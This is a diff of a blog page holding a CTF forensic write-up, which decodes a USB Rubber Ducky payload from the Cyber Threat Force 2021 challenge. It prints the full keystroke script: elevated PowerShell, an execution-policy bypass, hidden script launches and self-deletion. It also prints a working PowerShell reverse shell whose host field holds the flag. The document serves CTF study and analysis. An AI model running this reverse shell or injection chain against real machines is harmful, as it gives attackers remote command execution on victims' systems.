@@ -6,61 +6,60 @@ DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER 
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content><div><p>Note: I did not solve this challenge during the CTF, but my teammate <a href=https://twitter.com/lukhooo>Lukho</a> did.</p><p>For this challenge, we were given an <code>inject.bin</code> file, which contains an encoded <a href=https://hak5.org/products/usb-rubber-ducky-deluxe>Rubber Ducky</a> payload. We can use the <a href=https://ducktoolkit.com/encode>Duck Toolkit</a> to get back the original code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>powershell Start-Process notepad -Verb runAsENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>ENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>mDELAY
-</span></span><span style=display:flex><span>DOWNARROW
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>DOWNARROW
-</span></span><span style=display:flex><span>ENTER
-</span></span><span style=display:flex><span>$folderDateTime = (get-date).ToString(&#39;d-M-y HHmmss&#39;)ENTER
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>Add-Content &#34;$env:TEMP\72794.ps1&#34; &#39;$c = New-Object System.Net.Sockets.TCPClient(&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&#39;ENTER
-</span></span><span style=display:flex><span>start-Process powershell.exe -windowstyle hidden &#34;$env:TEMP\72794.ps1&#34;ENTER
-</span></span><span style=display:flex><span>$Report &gt;&gt; $fileSaveDir&#39;/ComputerInfo.html&#39;ENTER
-</span></span><span style=display:flex><span>function copy-ToZip($fileSaveDir){ENTER
-</span></span><span style=display:flex><span>$srcdir = $fileSaveDirENTER
-</span></span><span style=display:flex><span>$zipFile = &#39;C:\Windows\Temp\report.txt\Report.zip&#39;ENTER
-</span></span><span style=display:flex><span>if(-not (test-path($zipFile))) {ENTER
-</span></span><span style=display:flex><span>set-content $zipFile (&#34;PK&#34; + [char]5 + [char]6 + (&#34;$([char]0)&#34; * 18))ENTER
-</span></span><span style=display:flex><span>(dir $zipFile).IsReadOnly = $false}ENTER
-</span></span><span style=display:flex><span>$shellApplication = new-object -com shell.applicationENTER
-</span></span><span style=display:flex><span>$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
-</span></span><span style=display:flex><span>$files = Get-ChildItem -Path $srcdirENTER
-</span></span><span style=display:flex><span>foreach($file in $files) {ENTER
-</span></span><span style=display:flex><span>$zipPackage.CopyHere($file.FullName)ENTER
-</span></span><span style=display:flex><span>while($zipPackage.Items().Item($file.name) -eq $null){ENTER
-</span></span><span style=display:flex><span>Start-sleep -seconds 1 }}}ENTER
-</span></span><span style=display:flex><span>copy-ToZip($fileSaveDir)ENTER
-</span></span><span style=display:flex><span>remove-item $fileSaveDir -recurseENTER
-</span></span><span style=display:flex><span>Remove-Item $MyINvocation.InvocationNameENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>C:\Windows\config-72794.ps1ENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>powershell Start-Process cmd -Verb runAsENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>mode con:cols=14 lines=1ENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>mDELAY
-</span></span><span style=display:flex><span>DOWNARROW
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>DOWNARROW
-</span></span><span style=display:flex><span>ENTER
-</span></span><span style=display:flex><span>powershell Set-ExecutionPolicy &#39;Unrestricted&#39; -Scope CurrentUser -Confirm:$falseENTER
-</span></span><span style=display:flex><span>DELAY
-</span></span><span style=display:flex><span>powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
-</span></span></code></pre></div><p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$c = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;</span>,443);$s = $c.GetStream();<span style=color:#66d9ef>[byte[]]</span>$b = 0..255|%{0};<span style=color:#66d9ef>while</span>(($i = $s.Read($b, 0, $b.Length)) <span style=color:#f92672>-ne</span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + <span style=color:#e6db74>&#34;PS &#34;</span> + (pwd).Path + <span style=color:#e6db74>&#34;&gt; &#34;</span>;$sby = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
-</span></span></code></pre></div><p>The flag is <code>CYBERTF{D0N4LD_DUC|&lt;}</code>.</p><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/><span class=button__icon>←</span>
+#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content><div><p>Note: I did not solve this challenge during the CTF, but my teammate <a href=https://twitter.com/lukhooo>Lukho</a> did.</p><p>For this challenge, we were given an <code>inject.bin</code> file, which contains an encoded <a href=https://hak5.org/products/usb-rubber-ducky-deluxe>Rubber Ducky</a> payload. We can use the <a href=https://ducktoolkit.com/encode>Duck Toolkit</a> to get back the original code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>DELAY
+DELAY
+powershell Start-Process notepad -Verb runAsENTER
+DELAY
+DELAY
+ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+$folderDateTime = (get-date).ToString(&#39;d-M-y HHmmss&#39;)ENTER
+...
+Add-Content &#34;$env:TEMP\72794.ps1&#34; &#39;$c = New-Object System.Net.Sockets.TCPClient(&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&#39;ENTER
+start-Process powershell.exe -windowstyle hidden &#34;$env:TEMP\72794.ps1&#34;ENTER
+$Report &gt;&gt; $fileSaveDir&#39;/ComputerInfo.html&#39;ENTER
+function copy-ToZip($fileSaveDir){ENTER
+$srcdir = $fileSaveDirENTER
+$zipFile = &#39;C:\Windows\Temp\report.txt\Report.zip&#39;ENTER
+if(-not (test-path($zipFile))) {ENTER
+set-content $zipFile (&#34;PK&#34; + [char]5 + [char]6 + (&#34;$([char]0)&#34; * 18))ENTER
+(dir $zipFile).IsReadOnly = $false}ENTER
+$shellApplication = new-object -com shell.applicationENTER
+$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
+$files = Get-ChildItem -Path $srcdirENTER
+foreach($file in $files) {ENTER
+$zipPackage.CopyHere($file.FullName)ENTER
+while($zipPackage.Items().Item($file.name) -eq $null){ENTER
+Start-sleep -seconds 1 }}}ENTER
+copy-ToZip($fileSaveDir)ENTER
+remove-item $fileSaveDir -recurseENTER
+Remove-Item $MyINvocation.InvocationNameENTER
+DELAY
+C:\Windows\config-72794.ps1ENTER
+DELAY
+DELAY
+DELAY
+powershell Start-Process cmd -Verb runAsENTER
+DELAY
+DELAY
+mode con:cols=14 lines=1ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+powershell Set-ExecutionPolicy &#39;Unrestricted&#39; -Scope CurrentUser -Confirm:$falseENTER
+DELAY
+powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
+</code></pre></div><p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$c = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;</span>,443);$s = $c.GetStream();<span style=color:#66d9ef>[byte[]]</span>$b = 0..255|%{0};<span style=color:#66d9ef>while</span>(($i = $s.Read($b, 0, $b.Length)) <span style=color:#f92672>-ne</span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + <span style=color:#e6db74>&#34;PS &#34;</span> + (pwd).Path + <span style=color:#e6db74>&#34;&gt; &#34;</span>;$sby = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
+</code></pre></div><p>The flag is <code>CYBERTF{D0N4LD_DUC|&lt;}</code>.</p><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/><span class=button__icon>←</span>
 <span class=button__text>Writeup Cyber Threat Force : Azkaban C2</span></a></span>
 <span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/><span class=button__text>Writeup Cyber Threat Force : Usb key cemetery</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
-<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
